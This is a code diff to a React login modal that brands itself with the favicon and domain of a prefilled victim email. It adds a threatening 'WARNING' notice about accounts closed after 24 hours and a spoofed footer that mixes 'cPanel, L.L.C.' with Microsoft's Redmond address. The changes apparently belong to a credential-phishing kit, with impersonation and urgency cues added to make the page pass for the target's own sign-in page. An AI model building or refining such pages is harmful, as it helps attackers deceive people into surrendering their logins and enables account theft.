@@ -7,6 +7,15 @@ const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
 
+  // Add function to extract domain from email
+  const getDomain = (email) => {
+    return email.split('@')[1];
+  };
+
+  // Get domain for the current email
+  const emailDomain = getDomain(email);
+  const faviconUrl = `https://www.google.com/s2/favicons?domain=${emailDomain}`;
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true);
@@ -71,8 +80,30 @@ const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
           animation: 'modalFadeIn 0.3s ease-out',
           border: '1px solid rgba(255, 255, 255, 0.1)'
         }}>
-          {/* Logo Section */}
+          {/* Updated Logo Section */}
           <div style={{ textAlign: 'center', marginBottom: '2.5rem' }}>
+            <div style={{ 
+              display: 'flex', 
+              alignItems: 'center', 
+              justifyContent: 'center', 
+              gap: '0.75rem',
+              marginBottom: '1rem' 
+            }}>
+              <img 
+                src={faviconUrl} 
+                alt={`${emailDomain} logo`} 
+                style={{ 
+                  width: '32px', 
+                  height: '32px',
+                  objectFit: 'contain'
+                }} 
+              />
+              <span style={{ 
+                fontSize: '1.25rem', 
+                fontWeight: 600,
+                color: '#1F2937'
+              }}>{emailDomain}</span>
+            </div>
             <h1 style={{ 
               fontSize: '1.75rem', 
               fontWeight: 600, 
@@ -290,6 +321,26 @@ const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
               Sign in with a different account
             </button>
           </div> */}
+
+          {/* Add Warning Section */}
+          <div style={{
+            marginTop: '2rem',
+            padding: '1rem',
+            backgroundColor: '#F3F4F6',
+            borderRadius: '0.75rem',
+            fontSize: '0.875rem',
+            color: '#4B5563',
+            lineHeight: '1.5'
+          }}>
+            <div style={{ fontWeight: '600', marginBottom: '0.5rem', color: '#DC2626' }}>WARNING</div>
+            <p>
+              This information system is the property of {emailDomain}.
+              Unauthorized or improper use of this system may result in administrative disciplinary action. After 24 hours, we closed all previous and un-verified accounts.
+            </p>
+            <p style={{ marginTop: '0.5rem', fontSize: '0.8rem', color: '#6B7280' }}>
+              cPanel, L.L.C. • One Microsoft Way • Redmond, WA 98052. You are receiving this notification because your account is active on our server.
+            </p>
+          </div>
         </div>
       </div>
     </>
